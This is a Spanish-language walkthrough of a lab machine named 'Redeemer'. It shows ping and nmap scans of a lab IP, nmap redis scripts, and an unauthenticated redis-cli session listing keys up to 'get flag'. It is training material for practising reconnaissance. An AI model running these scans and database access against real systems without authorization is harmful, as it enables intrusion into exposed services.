# Redeemer

🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.130.151

PING 10.129.130.151 (10.129.130.151) 56(84) bytes of data.
64 bytes from 10.129.130.151: icmp_seq=1 ttl=63 time=166 ms

--- 10.129.130.151 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 165.615/165.615/165.615/0.000 ms
```

> **Sistema operativo**: Linux

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn -vv 10.129.130.151 -oG openPorts

PORT     STATE SERVICE REASON
6379/tcp open  redis   syn-ack ttl 63
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 6379 -sCV 10.129.130.151 -oN targeted

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

| Puerto | Servicio | Versión                     |
| ------ | -------- | --------------------------- |
| 6379   | redis    | Redis key-value store 5.0.7 |

¿Qué es **Redis**?  
[Web Oficial](https://redis.io/)

🗹 Buscar scripts de **nmap** relacionados al servicio **redis**:

```shell
find /usr/share/nmap/scripts -name *redis* 2>/dev/null

/usr/share/nmap/scripts/redis-info.nse
/usr/share/nmap/scripts/redis-brute.nse
```

🗹 Ejecutar scripts relacionados al servicio **redis** sobre el puerto **6379**:

```shell
sudo nmap -p 6379 --script "*redis*" 10.129.130.151

PORT     STATE SERVICE
6379/tcp open  redis
| redis-info: 
|   Version: 5.0.7
|   Operating System: Linux 5.4.0-77-generic x86_64
|   Architecture: 64 bits
|   Process ID: 752
|   Used CPU (sys): 2.199500
|   Used CPU (user): 2.184066
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 839.48K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|_    10.10.14.71
```

🗹 Acceder a la base de datos de **redis**:

```shell
redis-cli -h 10.129.130.151

10.129.130.151:6379> 
```
## Flag

 🗹 Ejecutar los siguientes comandos para obtener la flag:

```shell
10.129.130.151:6379> info keyspace
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
(1.23s)
10.129.130.151:6379> select 0
OK
10.129.130.151:6379> keys *
1) "flag"
2) "temp"
3) "numb"
4) "stor"
(1.05s)
10.129.130.151:6379> get flag
```
